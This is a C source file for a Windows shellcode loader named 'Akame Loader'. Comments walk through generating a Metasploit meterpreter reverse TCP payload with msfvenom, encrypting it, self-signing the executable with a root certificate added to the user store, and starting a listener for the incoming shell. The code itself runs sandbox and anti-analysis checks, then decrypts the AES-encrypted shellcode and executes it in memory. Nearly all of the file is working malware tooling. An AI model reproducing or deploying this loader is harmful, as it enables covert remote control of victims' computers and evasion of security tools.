#include <windows.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

/* Command to generate a reverse shell with metasploit
* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shellcode.bin
*/

/* Command to encrypt shellcode.bin
* mv shellcode.bin \Akame Loader\x64\Release\Resources\
* cd \Akame Loader\x64\Release\Resources\
* (optional) encrypt --help
* encrypt.exe -l cpp -m shellcode.bin -e random -o cli
*/

/* Commands to add a certificate
* move Akame.exe Resources && cd Resources
* makecert.exe -r -pe -n "CN=Akame CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv AkameCA.pvk AkameCA.cer
* certutil -user -addstore Root AkameCA.cer
* makecert.exe -pe -n "CN=Akame Cert" -a sha256 -cy end -sky signature -ic AkameCA.cer -iv AkameCA.pvk -sv AkameCert.pvk AkameCert.cer
* pvk2pfx.exe -pvk AkameCert.pvk -spc AkameCert.cer -pfx AkameCert.pfx
* signtool.exe sign /v /f AkameCert.pfx /t http://timestamp.digicert.com/?alg=sha1 Akame.exe
*/

/* Command to listen to incomming connections with metasploit
* msfconsole -q
* set payload windows/x64/meterpreter/reverse_tcp
* use exploit/multi/handler
* (optional) show options
* set LHOST <IP>
* exploit
*/

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
	// Check HDD
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned, diskSizeGB;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 100) return 0;

	// Delay execution
	Sleep(10000);
	
	// Check if tickcount-related functions were manipulated by the sandbox
	ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
	LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
	ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
	DWORD time = GetTickCount64();
	DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
		((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
	if ((time - kernelTime) > 100 && (kernelTime - time) > 100) return 0;

	// Payload
	char iv[] = { IV KEY HERE };

	char key[] = { KEY HERE };
    	unsigned int keylen = sizeof key;

	unsigned char buff[] = { SHELLCODE HERE };
	unsigned int bufflen = sizeof buff;

	// Allocate a memory buffer for the payload
	void* exec_mem = VirtualAlloc(0, bufflen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	// Decrypt the payload
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	DWORD mode = CRYPT_MODE_CBC;
	
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, 0))
	return 0;
	
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
	return 0;
	
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0))
	return 0;
	
	// SHA-256 hash the AES key
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, CRYPT_EXPORTABLE, &hKey))
	return 0;
	
	// Set the mode to CBC
	if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0))
	return 0;
	
	// Set the custom AES initialization value
	if (!CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv, 0))
	return 0;
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, buff, (DWORD*)&bufflen))
	return 0;
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	// Copy the payload to a new buffer
	RtlMoveMemory(exec_mem, buff, bufflen);
	
	// Make the new buffer as executable
	DWORD oldprotect = 0;
	BOOL rv = VirtualProtect(exec_mem, bufflen, PAGE_EXECUTE_READ, &oldprotect);
	
	// Run the payload
	if (rv != 0) {
	HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
	WaitForSingleObject(th, -1);
	}
	
	return 0;
}
